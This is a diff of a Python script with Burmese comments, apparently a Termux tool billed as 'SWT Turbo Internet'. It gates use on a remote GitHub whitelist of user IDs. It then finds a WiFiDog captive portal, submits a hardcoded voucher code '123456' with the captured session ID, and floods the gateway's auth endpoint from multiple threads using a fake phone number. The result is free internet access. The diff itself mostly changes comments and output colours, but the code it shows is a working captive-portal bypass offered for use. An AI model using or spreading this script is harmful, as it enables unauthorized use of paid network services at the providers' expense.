@@ -10,7 +10,7 @@ from urllib.parse import urlparse, parse_qs, urljoin
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- CONFIGURATION ---
+# --- CONFIGURATION (ပြင်ရန်မလို) ---
 WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
 PING_THREADS = 5
 PING_INTERVAL = 0.1
@@ -41,15 +41,16 @@ def show_banner():
 def check_approval():
     """Device ID ကို keys.txt နဲ့ တိုက်စစ်ခြင်း"""
     try:
-        # Termux ID သို့မဟုတ် Username ကို ယူခြင်း
-        device_id = os.popen("whoami").read().strip()
-        print(f"[*] Checking Approval for: {device_id}...")
+        # User ID ကို တိကျစွာယူခြင်း
+        device_id = os.popen("id -u -n").read().strip()
+        print(f"\033[1;33m[*] Detected ID: {device_id}\033[0m")
+        print("[*] Checking Authorization...")
         
         response = requests.get(WHITELIST_URL, timeout=10)
         allowed_users = response.text.splitlines()
         
         if device_id in allowed_users:
-            print("[+] Access Granted!")
+            print("\033[1;32m[+] Access Granted!\033[0m")
             time.sleep(1)
             return True
         else:
@@ -77,7 +78,8 @@ def status_display(start_time, start_data):
         current_data = get_data_usage()
         session_data = current_data - start_data
         
-        print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Data Used: {session_data:.2f} MB | Status: Online\033[0m", end='')
+        # တကြောင်းတည်းမှာ Live Update ပြခြင်း
+        print(f"\r\033[1;36m[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Data Used: {session_data:.2f} MB | Status: Online\033[0m", end='', flush=True)
         time.sleep(1)
 
 def high_speed_ping(auth_link, session):
@@ -91,6 +93,7 @@ def start_process():
     show_banner()
     check_approval()
     
+    # User Menu
     print("\n\033[1;33m[1] Start SWT Turbo Internet")
     print("[0] Exit\033[0m")
     
@@ -114,6 +117,7 @@ def start_process():
         try:
             r = requests.get(test_url, allow_redirects=True, timeout=5)
             
+            # အင်တာနက်ရသွားပြီဆိုလျှင် Status ပြမည်
             if r.url == test_url and check_real_internet():
                 if not timer_started:
                     start_time = time.time()
@@ -122,7 +126,7 @@ def start_process():
                 time.sleep(5)
                 continue
             
-            # Captive Portal Logic
+            # Captive Portal ရှာဖွေခြင်း
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
@@ -135,27 +139,28 @@ def start_process():
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             
             if sid:
-                # Voucher Activation
+                # Voucher Activation (123456)
                 voucher_api = f"{portal_host}/api/auth/voucher/"
                 session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
 
-                # Gateway Info
+                # Gateway Authentication
                 params = parse_qs(parsed_portal.query)
                 gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                 gw_port = params.get('gw_port', ['2060'])[0]
                 auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
 
-                # Turbo Threads
+                # Turbo Pinging Threads
                 for _ in range(PING_THREADS):
                     threading.Thread(target=high_speed_ping, args=(auth_link, session), daemon=True).start()
 
+                print(f"\n\033[1;32m[+] SID: {sid} Activated. Enjoy!\033[0m")
                 while check_real_internet(): time.sleep(5)
 
         except:
             time.sleep(2)
 
 if __name__ == "__main__":
-    # psutil မရှိရင် သွင်းခိုင်းမယ်
+    # Dependency Check
     try:
         import psutil
     except ImportError:
@@ -163,4 +168,3 @@ if __name__ == "__main__":
         import psutil
     
     start_process()
-
